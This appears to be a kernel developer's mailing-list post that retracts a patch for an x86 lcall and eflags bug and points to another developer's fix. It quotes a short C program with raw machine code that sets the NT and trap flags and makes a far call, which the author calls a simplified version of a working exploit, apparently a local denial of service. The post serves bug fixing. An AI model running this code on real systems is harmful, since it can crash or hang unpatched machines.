sorry, this is the wrong fix, it happened to fix the problem for the
only testcase working out there because such a testcase was written in a
way that used ptrace to set the eflags instead of a more simple
pushf popf lcall like this:
int main( void )
{
    char dos[] = "\x9C"                           /* pushfd       */
                 "\x58"                           /* pop eax      */
                 "\x0D\x00\x41\x00\x00"           /* or eax,4100h  */
                 "\x50"                           /* push eax     */
                 "\x9D"                           /* popfd        */
                 "\x9A\x00\x00\x00\x00\x07\x00";  /* call 07h:00h */
    void (* f)( void );
    f = (void *) dos; (* f)();
    return 1;
}
(note the above is differnet to the one posted on bugtraq, the above one
is a simple version of the "working" exploit posted to l-k)
I clearly misunderstood how the nt works, it is read from the in core
eflags, not from the copy on the stack, so my patch won't make any
difference as far as the kernel is concerned and the only problem was
again with lcall, so the right fix is the last one from Petr.  sorry for
the spam.
